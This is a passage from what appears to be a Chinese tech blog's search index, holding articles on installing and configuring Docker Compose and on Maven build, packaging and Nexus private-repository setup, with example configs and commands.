&lt;!-- lastmod，指该条数据的最新一次更新时间，最少出现 0 次 最多出现 1 次，类型为日期或日期时间，格式为 YYYY-MM-DD 的日期或者 格式为 YYYY-MM-DDThh:mm:ss 的日期时间（请注意日期与时间之间以“T”分隔） --&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;!-- changefreq，指该条数据的更新频率，最少出现 0 次 最多出现 1 次，类型为字符串，有效值为：always、hourly、daily、weekly、monthly、yearly、never --&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;!-- priority，用来指定此链接相对于其他链接的优先权比值，此值定于 0.0-1.0 之间，最少出现 0 次 最多出现 1 次，类型为小数，最小值为（包含）0.0 最大值为（包含）1.0 --&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt;&lt;/urlset&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"爬虫"},{title:"Docker 之十七 Docker-Compose 安装与使用",url:"/posts/b31f4d18.html",text:'相关站点 Docker Compose Docs Docker Compose Github Docker Compose Releases Docker Compose 介绍 Docker Compose 项目来源于以前的 fig 项目，使用 Python 语言编写，是 Docker 官方推出的一款单机容器编排工具，与 Docker Swarm、Docker Machine 并称为 Docker 容器编排三剑客。其支持定义和运行多容器的应用，可以一条命令启动多个容器，使用 Docker Compose 后不再需要使用 Shell 脚本来启动容器。Docker Compose 通过一个配置文件来管理多个 Docker 容器，在配置文件中所有的容器通过 services 来定义，然后使用 docker-compose 命令来启动、停止、重启应用和应用中的服务以及所有依赖服务的容器，非常适合组合使用多个容器进行开发的场景。 安装 Docker Compose Docker Compose 具体的版本号可以从 Docker Compose Releases 获取。 1234567891011# 下载二进制文件，如果需要安装其他版本的话，修改下面命令中的版本号即可# curl -L https://github.com/docker/compose/releases/download/1.29.2/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose# 校验二进制文件的完整性，对比下载页面中二进制文件真实的SHA-256sum值# sha256sum /usr/local/bin/docker-compose# 赋予二进制文件可执行权限# chmod +x /usr/local/bin/docker-compose# 查看docker-compose的版本号# docker-compose version 安装 Docker Compose 的命令自动补全工具 1234567# 安装bash命令自动补全软件包# yum install bash-completion# 下载docker-compose命令自动补全工具的二进制文件，这里的版本号必须和上面docker-compose的版本号一致# curl -L https://raw.githubusercontent.com/docker/compose/1.29.2/contrib/completion/bash/docker-compose -o /etc/bash_completion.d/docker-compose# 注意：docker-compose命令自动补全功能在重新登录后才会生效 Docker Compose 常用命令 1234567891011121314151617181920# 拉取镜像# docker-compose pull# 创建并前台启动容器# docker-compose up# 创建并后台启动容器# docker-compose up -d# 查看容器的运行状态# docker-compose ps# 启动容器# docker-compose start# 停止容器# docker-compose stop# 停止并删除容器，包括网络、数据卷（特别注意，此操作会删除所有容器的数据，且数据不可恢复）# docker-compose down 若 YAML 配置文件不在当前目录下，或者配置文件名不是 docker-compose.yml、docker-compose.yaml，那么则需要通过 -f 参数指定 YAML 配置文件的路径 12# 指定YAML配置文件，拉取镜像# docker-compose -f /example/nacos-standalone-mysql-5.7.yml pull Docker Compose 配置文件编写示例 docker-compose.yml 配置文件的内容如下，主要定义了容器 zookeeper 与 dubbo-admin，其中通过自定义网络（网桥）来指定每个容器的 IP 地址（静态 IP） 1234567891011121314151617181920212223242526272829303132version: "3.5"services: zookeeper: image: clay/zookeeper-server:3.4.13 container_name: dubbo-zookeeper ports: - 2181:2181 networks: distributed-network: ipv4_address: 172.171.0.2 volumes: - \'/container/zookeeper/log:/usr/local/zookeeper-3.4.13/log\' - \'/container/zookeeper/data:/usr/local/zookeeper-3.4.13/data\' dubbo-admin: image: clay/dubbo-admin:0.1 container_name: dubbo-admin depends_on: - zookeeper networks: distributed-network: ipv4_address: 172.171.0.3 ports: - 8083:8080networks: distributed-network: name: distributed-network driver: bridge ipam: config: - subnet: 172.171.0.0/24 Docker Compose 覆盖镜像中的 CMD 指令 12345678910111213version: "3.5"services: redis: image: redis:5.0.4-stretch container_name: redis-5.0.4 privileged: false ports: - 6379:6379 volumes: - \'/container/redis/data:/data\' - \'/container/redis/redis.conf:/usr/local/etc/redis/redis.conf\' command: redis-server /usr/local/etc/redis/redis.conf Docker Compose 指定网络模式 12345678910111213141516version: "2"services: nacos: image: nacos/nacos-server:latest container_name: nacos-standalone-mysql env_file: - /usr/nacos/env/nacos-standlone-mysql.env volumes: - /usr/nacos/logs/:/home/nacos/logs - /usr/nacos/init.d/custom.properties:/home/nacos/init.d/custom.properties ports: - "8848:8848" - "9555:9555" network_mode: host restart: on-failure Docker Compose 指定环境变量 1234567891011121314version: "3.5"services: nacos: image: nacos:2.0.2 container_name: nacos-server privileged: false restart: always ports: - 8848:8848 environment: - MODE=standalone - TRACK=-javaagent:/opt/skywalking-agent.jar - JAVA_OPTS=-Xms512m -Xmx1024m -XX:SurvivorRatio=8 -XX:+UseConcMarkSweepGC 参考资料 Docker Compose 菜鸟教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Maven 开发随笔",url:"/posts/5fee1c55.html",text:'Maven 使用Maven 调试技巧 mvn dependency:tree，打印依赖树 mvn clean -X，使用 -X 参数输出详细的日志信息 mvn -X，查看当前生效的是哪个 settings.xml 配置文件 mvn help:effective-settings，查看正在起作用的是那个 settings.xml 的文件内容 打包跳过测试用例 使用命令 mvn install -DskipTests，不执行测试用例，但会编译测试用例类的代码 使用命令 mvn install -Dmaven.test.skip=true，不但跳过单元测试的运行，也跳过单元测试代码的编译 添加阿里云镜像仓库添加阿里云的镜像到 Maven 的 setting.xml 配置文件中，这样就不需要每次在项目的 pom.xml 中添加镜像仓库的配置内容，在 &lt;mirrors&gt; 节点里添加对应的子节点即可： 1234567891011121314&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;repo2&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt;&lt;/mirrors&gt; Maven 项目配置打包源码有时候开发一个公共 Jar 包给别人引用，当别人打开包中的类的时候，默认情况下打开的是 IDE 工具反编译出来的 .class 文件，类中的注释什么的都看不到，此时 IDE 工具会提示可以 Download Sources，但是如果打包的时候没有同时打一个以 -sources.jar 结尾的源码 Jar 包，那么调用方下载源码包的时候就会失败。maven-source 插件就是用来打包源码的，可以部署到私有仓库上的，对于需要查看源码、注释和调试代码，有很大的帮助。 123456789101112&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;attach-sources&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; 打包跳过测试用例12345678&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;configuration&gt; &lt;skipTests&gt;true&lt;/skipTests&gt; &lt;/configuration&gt;&lt;/plugin&gt; 使用阿里云镜像仓库编辑项目的 pom.xml 文件，添加阿里云中央仓库的配置内容。 123456789101112131415161718192021222324252627&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;public&lt;/id&gt; &lt;name&gt;aliyun nexus&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt;&lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;public&lt;/id&gt; &lt;name&gt;aliyun nexus&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt;&lt;/pluginRepositories&gt; 值得一提的是，Maven 默认中央仓库的 id 为 central。其中 id 是唯一的，因此使用 &lt;id&gt;central&lt;/id&gt; 就可以覆盖默认的中央仓库。 指定编译的 JDK 版本方式一 1234&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt;&lt;/properties&gt; 方法二 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;/configuration&gt;&lt;/plugin&gt; 方法三 该方式并非 Maven 官方配置，要使该方式能够生效首先必须满足以下两个条件： 项目为一个 SpringBoot 工程 项目的 POM 继承了 spring-boot-starter-parent 123456789&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt;&lt;/properties&gt; 引入本地的 Jar 包方法一（推荐） 通过 mvn install 命令手动将 Jar 包安装到 Maven 本地仓库（如下），相关资料可参考这里 1$ mvn install:install-file -Dfile=taobao-sdk-java-auto.jar -DgroupId=com.dingtalk -DartifactId=dingtalk-api-sdk -Dversion=1.0.0-SNAPSHOT -Dpackaging=jar 最后在 pom.xml 里正常引入对应的依赖即可： 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 若需要从本地仓库卸载特定的本地 Jar 包，可以在 pom.xml 所在目录下执行以下命令，其中 -DmanualInclude 的参数格式为 groupId:artifactId 12345# 从Maven本地仓库卸载某个Jar包$ mvn dependency:purge-local-repository -DmanualInclude="com.dingtalk:dingtalk-api-sdk"# 阻止Maven对已删除的Jar包进行ReResolve$ mvn dependency:purge-local-repository -DreResolve=false 方法二（推荐） 通过 Maven 插件将本地 Jar 包安装到 Maven 本地仓库（如下），值得一提的是，需要手动执行 mvn clean &amp;&amp; mvn install 命令将本地 Jar 包安装到 Maven 本地仓库，相关资料可参考这里 123456789101112131415161718192021222324252627&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;version&gt;2.5.2&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;install-external&lt;/id&gt; &lt;phase&gt;clean&lt;/phase&gt; &lt;configuration&gt; &lt;file&gt;${project.basedir}/lib/taobao-sdk-java-auto.jar&lt;/file&gt; &lt;repositoryLayout&gt;default&lt;/repositoryLayout&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;generatePom&gt;true&lt;/generatePom&gt; &lt;/configuration&gt; &lt;goals&gt; &lt;goal&gt;install-file&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 最后在 pom.xml 里正常引入对应的依赖即可： 12345&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; 方法三（不推荐） 假设项目的目录结构如下： 12345market├── common-api│&nbsp;&nbsp; └── lib│&nbsp;&nbsp; └── taobao-sdk-java-auto.jar└── common-cache 在 common-api 模块下的 pom.xml 添加以下依赖来引入本地 Jar 包： groupId：自定义 artifactId：自定义 version：自定义 scope：必须是 system systemPath：Jar 包的路径，${project.basedir} 是指当前 pom.xml 所在的目录 1234567&lt;dependency&gt; &lt;groupId&gt;com.dingtalk&lt;/groupId&gt; &lt;artifactId&gt;dingtalk-api-sdk&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/lib/taobao-sdk-java-auto.jar&lt;/systemPath&gt;&lt;/dependency&gt; 若 common-api 模块是普通 Maven 项目，那么打包时需要添加以下配置，目的是将本地 Jar 包同时打包在一起： directory：指定 lib 文件夹的位置，一般直接写上 ${project.basedir}/lib 即可 targetPath：打包到的文件夹位置，写上 BOOT-INF/lib 即可，或者是 WEB-INF/lib includes：一般都是以 .jar 结尾，直接写 **/*.jar 即可 123456789101112131415161718&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;${project.basedir}/lib&lt;/directory&gt; &lt;targetPath&gt;/BOOT-INF/lib/&lt;/targetPath&gt; &lt;includes&gt; &lt;include&gt;**/*.jar&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; 若 common-api 模块是 SpringBoot 项目，那么打包时需要添加以下配置，目的是将本地 Jar 包同时打包在一起： 1234567891011&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 单元测试拷贝资源文件@SpringBootTest 注解，只会加载 src/test 路径下的资源文件（如 XML 配置），并不会加载 src/main 路径下的资源文件。若需要在执行单元测试时，加载 src/main 路径下的资源文件，需要让 Maven 拷贝对应的资源文件到 src/test 路径下： 1234567891011121314151617181920&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.*&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;!--单元测试时引用src/main/resources下的资源文件--&gt; &lt;testResources&gt; &lt;testResource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;testResource&gt; &lt;directory&gt;src/test/resources&lt;/directory&gt; &lt;/testResource&gt; &lt;/testResources&gt;&lt;/build&gt; 编译时过滤字体图标文件如果 Maven 编译项目时，出现下述的错误信息。这一般是 Maven 的 filter 解析字体图标文件时，破坏了文件的二进制文件格式导致的。 1filtering /xxxx/target/classes/static/fonts/webfont.ttf failed with MalformedInputException: Input length = 1 -&gt; [Help 1] 第一种解决方案（推荐）： 1234567891011121314151617181920212223242526&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;true&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;configuration&gt; &lt;nonFilteredFileExtensions&gt; &lt;nonFilteredFileExtension&gt;woff&lt;/nonFilteredFileExtension&gt; &lt;nonFilteredFileExtension&gt;woff2&lt;/nonFilteredFileExtension&gt; &lt;nonFilteredFileExtension&gt;eot&lt;/nonFilteredFileExtension&gt; &lt;nonFilteredFileExtension&gt;ttf&lt;/nonFilteredFileExtension&gt; &lt;nonFilteredFileExtension&gt;otf&lt;/nonFilteredFileExtension&gt; &lt;nonFilteredFileExtension&gt;svg&lt;/nonFilteredFileExtension&gt; &lt;/nonFilteredFileExtensions&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 第二种解决方案： 123456789101112131415161718192021222324&lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;includes&gt; &lt;include&gt;**/*.woff&lt;/include&gt; &lt;include&gt;**/*.ttf&lt;/include&gt; &lt;include&gt;**/*.woff2&lt;/include&gt; &lt;include&gt;**/*.otf&lt;/include&gt; &lt;include&gt;**/*.eot&lt;/include&gt; &lt;include&gt;**/*.svg&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 将所有依赖包打包进单个 Jar 包若 Maven 打包时，需要将项目源码与所有依赖包一起打包在单个 Jar 文件中，可以参考以下配置： 12345678910111213141516171819202122&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 将项目的测试代码打包进 Jar 包 Maven 支持打包的插件列表如下： plugin function maven-jar-plugin maven 默认打包插件，用来创建 project jar maven-shade-plugin 用来打可执行包，executable (fat) jar maven-assembly-plugin 支持定制化打包方式，例如 apache 项目的打包方式 添加 maven-assembly-plugin 插件： 1234567891011121314151617&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;descriptors&gt;src/main/resources/assembly.xml&lt;/descriptors&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt;&lt;/plugin&gt; 还可以在上面的 configuration 节点中指定执行 Jar 包时的 Test 主类： 12345678&lt;configuration&gt; &lt;descriptors&gt;src/main/resources/assembly.xml&lt;/descriptors&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;com.sample.TestMain&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt;&lt;/configuration&gt; 创建 assembly.xml 配置文件： 123456789101112131415161718192021222324252627282930313233&lt;assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3 http://maven.apache.org/xsd/assembly-1.1.3.xsd"&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;formats&gt; &lt;format&gt;jar&lt;/format&gt; &lt;/formats&gt; &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt; &lt;dependencySets&gt; &lt;dependencySet&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt; &lt;unpack&gt;true&lt;/unpack&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependencySet&gt; &lt;/dependencySets&gt; &lt;fileSets&gt; &lt;fileSet&gt; &lt;directory&gt;${project.build.directory}/test-classes&lt;/directory&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;includes&gt; &lt;include&gt;**/*.class&lt;/include&gt; &lt;/includes&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/fileSet&gt; &lt;/fileSets&gt;&lt;/assembly&gt; 特别注意：上面 assembly.xml 里的配置，默认会将所有 Jar 包的源码一起打包（包括依赖的第三方 Jar 包），如果只希望打包项目自身的源码，那么则需要添加 exclude 节点来排除依赖： 123456789101112131415161718192021222324252627282930313233343536373839&lt;assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.3 http://maven.apache.org/xsd/assembly-1.1.3.xsd"&gt; &lt;id&gt;assembly&lt;/id&gt; &lt;formats&gt; &lt;format&gt;jar&lt;/format&gt; &lt;/formats&gt; &lt;includeBaseDirectory&gt;false&lt;/includeBaseDirectory&gt; &lt;dependencySets&gt; &lt;dependencySet&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;useProjectArtifact&gt;true&lt;/useProjectArtifact&gt; &lt;unpack&gt;true&lt;/unpack&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;excludes&gt; &lt;exclude&gt;org.slf4j:slf4j-api&lt;/exclude&gt; &lt;exclude&gt;com.fasterxml.jackson.core:*&lt;/exclude&gt; &lt;exclude&gt;org.apache.httpcomponents:*&lt;/exclude&gt; &lt;exclude&gt;com.google.guava:guava&lt;/exclude&gt; &lt;/excludes&gt; &lt;/dependencySet&gt; &lt;/dependencySets&gt; &lt;fileSets&gt; &lt;fileSet&gt; &lt;directory&gt;${project.build.directory}/test-classes&lt;/directory&gt; &lt;outputDirectory&gt;/&lt;/outputDirectory&gt; &lt;includes&gt; &lt;include&gt;**/*.class&lt;/include&gt; &lt;/includes&gt; &lt;useDefaultExcludes&gt;true&lt;/useDefaultExcludes&gt; &lt;/fileSet&gt; &lt;/fileSets&gt;&lt;/assembly&gt; 运行以下打包命令，会生成 xxxx-1.0.0-SNAPSHOT-assembly.jar 文件，其中文件名里的 assembly 是由 assembly.xml 配置文件里的 id 节点指定： 1$ mvn package Maven 私有仓库配置通过插件上传 Jar 包到私有仓库编辑 Maven 的 settings.xml 配置文件，通过添加 server 节点来配置私有仓库的账号和密码，这里的 id 可以随便取名字，但必须与下面配置的 id 一致： 1234567891011&lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt;&lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt; 编辑 Maven 的 settings.xml 配置文件，通过添加 mirror 节点来配置私有仓库的地址，这里的 id 必须和上面 server 节点的 id 一致： 12345678910111213&lt;mirror&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;nexus maven releases repo&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/releases/&lt;/url&gt;&lt;/mirror&gt;&lt;mirror&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;nexus maven snapshots repo&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt;&lt;/mirror&gt; 编辑项目的 pom.xml 文件，添加以下内容，这里的 id 必须与 上面 mirror 节点里的 id 一致： 1234567891011121314&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt; &lt;!-- &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;name&gt;Nexus Releases Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/releases/&lt;/url&gt; &lt;/repository&gt; --&gt;&lt;/distributionManagement&gt; 执行发布命令： 1$ maven clean deploy Maven 常见问题解决上传 Jar 包到私有仓库出现 400 错误码一般有 3 个导致出现上面问题的原因： 一、pom.xml 中仓库 id 配置不对，检查 pom.xml 中配置的 distributionManagement 中的仓库 id、url 和私服 Nexus 中的是否相同 1234567&lt;distributionManagement&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;name&gt;Nexus Snapshots Repository&lt;/name&gt; &lt;url&gt;http://127.0.0.1:8081/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt;&lt;/distributionManagement&gt; 二、私服 Nexus 已经存在相同版本且代码完全一样的 Jar 包，同时部署策略为不允许覆盖；此时只需要将仓库对应的 Deployment Policy 设置为 Allow Redeploy 即可 三、如果 Repository Policy 为 Release，则部署 Jar 包的版本号中不允许出现 snapshot 关键字；特别注意，Repository Policy 有两个选项，一个发布版本，一个是快照版本，要和部署 Jar 包的版本号完全对应 上传 Jar 包到私有仓库出现 401 错误码一般报 401 这个错误码，是因为没有发布权限，而没发布权限的原因，大部分都是因为密码错了导致，或者账号本身就没有发布 Jar 包的权限。如果是密码错误，则可以编辑 Maven 的 settings.xml 配置文件，通过添加 server 节点来配置私有仓库的账号和密码： 1234567891011&lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt;&lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt;&lt;/server&gt; 如果密码正确，账号本身也具有发布 Jar 包的权限，但依然提示 401 错误，那么此时应该检查当前生效的 settings.xml 配置文件是哪个，查询命令如下： 12345$ mvn -X[DEBUG] Reading global settings from /usr/develop/maven-3.6.0/conf/settings.xml[DEBUG] Reading user settings from /root/.m2/settings.xml[DEBUG] Reading global toolchains from /usr/develop/maven-3.6.0/conf/toolchains.xml[DEBUG] Reading user toolchains from /root/.m2/toolchains.xml 如果上面输出的 global settings 指向的配置文件不是所期望的，此时就应该注意了，可以使用以下命令进一步查看正在起作用的那个 settings.xml 的内容： 1$ mvn help:effective-settings Nexus 常见问题解决指定 Nexus 使用的 JDK 版本 Nexus Version Supported Sun/Oracle JRE version 1.9 and earlier 5 or 6 2.0-2.5 6 or 7 2.6.x 7u45+, only 8+ will not work 2.7.x-2.9.x 7u45+, 8+ may work but is not thoroughly tested 2.10.x-2.11.1 7u45+, 8u25+ 2.11.2+ 8u31+ strongly recommended, 7u79+ no further public updates as of April 2015 2.12.0-01 8u31+ strongly recommended, 11.0.9 not work 由于以前安装的 Nexus 版本为 2.12.0-01，JDK 版本为 8，后来 JDK 升级为 11 后，Nexus 无法启动，因此只能指定 Nexus 默认使用 JDK 8，方法如下： 123456789101112131415# 进入配置文件所在的目录$ cd nexus/nexus-2.12.0-01/bin/jsw/conf# 备份配置文件$ cp wrapper.conf wrapper.conf.default# 编辑配置文件，指定JDK的安装路径$ vim wrapper.confwrapper.java.command=/usr/java/jdk1.8.0_102/bin/java# 重启Nexus服务$ service nexus restart# 查看Nexus服务的运行状态$ service nexus status Maven 实用插件介绍项目打包与 Git Commit 信息关联插件Maven 